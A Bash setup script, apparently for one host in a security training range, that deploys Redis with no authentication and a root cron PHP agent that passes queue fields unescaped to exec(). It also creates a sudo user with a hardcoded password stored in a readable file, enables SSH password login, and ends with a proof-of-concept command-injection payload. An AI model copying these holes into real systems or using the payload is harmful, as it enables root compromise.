#!/bin/bash
# ============================================================
# Server-C2 (Internal) 一键部署 — Redis 缓存发布支撑节点
# 用法: sudo bash deploy_c2.sh
# 前提: 已从 Git clone 项目到本地，在项目根目录执行
#       Ubuntu 20.04/22.04, 可连接互联网
# ============================================================
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

echo "============================================"
echo " Server-C2 (Internal) 一键部署"
echo " Redis 缓存发布支撑节点 + cache-agent"
echo "============================================"

if [ "$EUID" -ne 0 ]; then
    echo "[ERROR] 请用 sudo 运行: sudo bash $0"
    exit 1
fi

# ============ 1. 系统更新 ============
echo "[1/10] 更新系统..."
apt update && apt upgrade -y

# ============ 2. 安装软件包 ============
echo "[2/10] 安装 Redis + PHP CLI..."
# 先尝试 PHP 8.1, 失败则回退到 PHP 7.4 (Ubuntu 20.04)
set +e
DEBIAN_FRONTEND=noninteractive apt install -y \
    redis-server \
    php8.1-cli php8.1-redis php8.1-mbstring \
    curl wget netcat-openbsd nmap vim openssh-server unzip 2>&1
PHP81_OK=$?
set -e

if [ $PHP81_OK -ne 0 ]; then
    echo "   [INFO] PHP 8.1 不可用，改用 PHP 7.4..."
    DEBIAN_FRONTEND=noninteractive apt install -y \
        redis-server \
        php7.4-cli php-redis php7.4-mbstring \
        curl wget netcat-openbsd nmap vim openssh-server unzip
fi
echo "   [OK] 软件包安装完成"

# ============ 3. 配置 Redis ============
echo "[3/10] 配置 Redis..."
cat > /etc/redis/redis.conf << 'REDISEOF'
# Redis 缓存发布节点配置
bind 127.0.0.1 192.168.110.20
port 6379
protected-mode no
daemonize yes
pidfile /var/run/redis/redis-server.pid
loglevel notice
logfile /var/log/redis/redis-server.log
databases 16
save 900 1
save 300 10
save 60 10000
dbfilename dump.rdb
dir /var/lib/redis
# requirepass 注释 — 内网缓存节点无需认证
REDISEOF

systemctl enable redis-server
systemctl restart redis-server
echo "   [OK] Redis 配置完成 — bind 127.0.0.1 192.168.110.20:6379, 无认证"

# ============ 4. 创建 cache-agent ============
echo "[4/10] 创建 cache-agent..."
mkdir -p /opt/cache-agent

# publish_content.sh 业务存根
cat > /opt/cache-agent/publish_content.sh << 'STUBEOF'
#!/bin/bash
# 内容发布脚本 — 刷新CDN节点缓存
# 用于频道封面、EPG文件、推荐位缓存刷新

TARGET=""
FILE=""
OPTIONS=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --target) TARGET="$2"; shift 2 ;;
        --file) FILE="$2"; shift 2 ;;
        --options) OPTIONS="$2"; shift 2 ;;
        *) shift ;;
    esac
done

TS=$(date '+%Y-%m-%d %H:%M:%S')
echo "[${TS}] [INFO] publish task received"
echo "[${TS}] [INFO] target: ${TARGET}"
echo "[${TS}] [INFO] file: ${FILE}"
echo "[${TS}] [INFO] options: ${OPTIONS}"

# 业务发布逻辑
# 实际环境中此处执行文件分发与CDN缓存刷新
echo "[${TS}] [INFO] refresh epg cache"
echo "[${TS}] [INFO] refresh channel cover cache"
[ -n "${OPTIONS}" ] && echo "[${TS}] [WARN] legacy task format compatibility enabled"

echo "[${TS}] [INFO] publish task completed"
STUBEOF
chmod +x /opt/cache-agent/publish_content.sh

# cache_publish_agent.php — 每分钟从Redis读取发布队列
cat > /opt/cache-agent/cache_publish_agent.php << 'PHPEOF'
<?php
/**
 * Cache Publish Agent
 * 读取Redis发布队列，执行内容缓存刷新任务
 * 由cron每分钟调用
 */

$logFile = '/var/log/cache-agent.log';

function writeLog($msg) {
    global $logFile;
    $ts = date('Y-m-d H:i:s');
    @file_put_contents($logFile, "[{$ts}] {$msg}" . PHP_EOL, FILE_APPEND);
}

writeLog('[INFO] load publish task from redis key media:publish:queue');

try {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379, 2);

    $taskCount = 0;
    while ($task = $redis->lPop('media:publish:queue')) {
        $taskCount++;
        $data = json_decode($task, true);
        if (!$data || !isset($data['target'])) {
            writeLog('[WARN] skip invalid task format');
            continue;
        }

        $target  = $data['target'] ?? '';
        $file    = $data['file'] ?? '';
        $options = $data['options'] ?? '';

        writeLog("[INFO] processing task: target={$target}");

        // 执行发布脚本
        $cmd = "/opt/cache-agent/publish_content.sh"
             . " --target \"{$target}\""
             . " --file \"{$file}\""
             . " --options \"{$options}\"";

        $output = [];
        $retval = 0;
        exec($cmd, $output, $retval);

        // 记录执行结果到Redis
        $redis->hSet('media:publish:results', uniqid('task_', true), json_encode([
            'target'    => $target,
            'exit_code' => $retval,
            'output'    => implode("\n", $output),
            'timestamp' => date('Y-m-d H:i:s')
        ], JSON_UNESCAPED_UNICODE));
    }

    // 更新最后任务时间
    $redis->set('media:publish:last_job', date('Ymd_His'));
    writeLog("[INFO] completed {$taskCount} tasks");

} catch (Exception $e) {
    writeLog('[ERROR] redis connection failed: ' . $e->getMessage());
    exit(1);
}
PHPEOF
chmod 755 /opt/cache-agent/cache_publish_agent.php

echo "   [OK] cache-agent 创建完成"

# ============ 5. Cron 定时任务 ============
echo "[5/10] 配置 cron 定时任务..."
cat > /etc/cron.d/cache-agent << 'CRONEOF'
# Cache Publish Agent — 每分钟读取Redis发布队列
* * * * * root /usr/bin/php /opt/cache-agent/cache_publish_agent.php > /dev/null 2>&1
CRONEOF
chmod 644 /etc/cron.d/cache-agent
systemctl restart cron
echo "   [OK] cron: 每分钟以 root 执行 cache_publish_agent.php"

# ============ 6. 预填充 Redis 数据 ============
echo "[6/10] 预填充 Redis 业务数据..."
redis-cli SET "media:publish:last_job" "EPG_SYNC_20260523"
redis-cli SET "media:cache:status" "normal"
redis-cli SET "media:ops:note" "cache publish node only reachable from content platform"
redis-cli SET "media:agent:config" "/opt/cache-agent/cache_publish_agent.php"
redis-cli HMSET "media:cache:nodes" \
    "node-01" "192.168.110.21:6379" \
    "node-02" "192.168.110.22:6379" \
    "node-03" "192.168.110.23:6379"

# 队列中放入一条示例任务
redis-cli LPUSH "media:publish:queue" '{"target":"华北缓存节点-01","file":"epg_cctv1_20260523.xml","options":"--legacy"}'

echo "   [OK] Redis 业务 Key 已预填充"

# ============ 7. 防火墙 ============
echo "[7/10] 配置防火墙..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
# 仅允许 C1 (192.168.110.10) 访问 Redis
ufw allow from 192.168.110.10 to any port 6379 proto tcp
ufw --force enable
echo "   [OK] 防火墙: 22/tcp + Redis仅允许 192.168.110.10"

# iptables 兜底
iptables -A INPUT -p tcp --dport 6379 -s 192.168.110.10 -j ACCEPT 2>/dev/null || true
iptables -A INPUT -p tcp --dport 6379 -j DROP 2>/dev/null || true

# ============ 8. 日志文件 ============
echo "[8/10] 初始化日志..."
touch /var/log/cache-agent.log
chmod 644 /var/log/cache-agent.log
echo "   [OK] 日志: /var/log/cache-agent.log"

# ============ 9. operator 用户 ============
echo "[9/10] 创建运维用户..."
useradd -m -s /bin/bash operator 2>/dev/null || true
echo 'operator:0p3rat0r@GDJ' | chpasswd 2>/dev/null || true
usermod -aG sudo operator 2>/dev/null || true

mkdir -p /opt/ops
cat > /opt/ops/access.txt << 'OPSEOF'
=====================================================
  缓存发布支撑节点 — 部署信息
  部署日期: 2024-06-15
=====================================================

  服务端口:
    - Redis: 6379 (仅允许内容运营平台 192.168.110.10 访问)
    - SSH: 22

  Redis 配置:
    地址: 192.168.110.20:6379
    认证: 无

  Redis 业务 Key:
    media:publish:queue      发布任务队列 (LIST)
    media:publish:last_job   最后任务标识
    media:publish:results    任务执行结果 (HASH)
    media:cache:nodes        缓存节点列表 (HASH)
    media:cache:status       缓存状态
    media:ops:note           运维备注
    media:agent:config       agent 配置路径

  Cache Agent:
    脚本: /opt/cache-agent/cache_publish_agent.php
    Cron: * * * * * root (每分钟)
    日志: /var/log/cache-agent.log

  SSH 运维:
    operator / 0p3rat0r@GDJ
OPSEOF
chmod 644 /opt/ops/access.txt

# ============ 10. 收尾 ============
echo "[10/10] 清理收尾..."
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null || true
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || true
rm -rf /tmp/*
history -c

echo ""
echo "============================================"
echo "  [OK] Server-C2 (Internal) 部署完成!"
echo "============================================"
echo "  Redis:     192.168.110.20:6379"
echo "  Cache Key: media:publish:queue"
echo "  Agent:     /opt/cache-agent/cache_publish_agent.php"
echo "  Cron:      每分钟 root 执行"
echo "============================================"
echo ""
echo "攻击链验证 (C2 从C1横向):"
echo "  1. redis-cli -h 192.168.110.20 PING"
echo "  2. redis-cli -h 192.168.110.20 KEYS 'media:*'"
echo "  3. redis-cli -h 192.168.110.20 LPUSH media:publish:queue '{\"target\":\"; id ;\",\"file\":\"poc\",\"options\":\"\"}'"
echo "  4. 等待60秒后查看 /var/log/cache-agent.log"
echo "============================================"
